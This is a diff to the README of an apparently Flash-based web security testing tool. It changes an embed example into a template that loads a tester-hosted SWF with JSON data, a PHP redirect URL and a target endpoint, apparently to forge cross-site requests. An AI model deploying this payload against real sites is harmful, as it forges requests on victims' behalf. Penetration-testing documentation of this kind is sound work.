@@ -50,7 +50,7 @@ By using this testing tool you accept the fact that any damage (dataleak, system
 ## Update
 Starting with Chrome 62, direct link to SWF file may not work. If this behavior happens, use custom HTML page with this, or any other embedding method:
 ```
-<embed src='path_to_swf'></embed>
+<embed src='http[s]://[yourhost-and-path]/test.swf?jsonData=[yourJSON]&php_url=http[s]://[yourhost-and-path]/test.php&endpoint=http[s]://[targethost-and-endpoint]'></embed>
 ```
 
 ## Commits, PRs and bug reports are welcome!
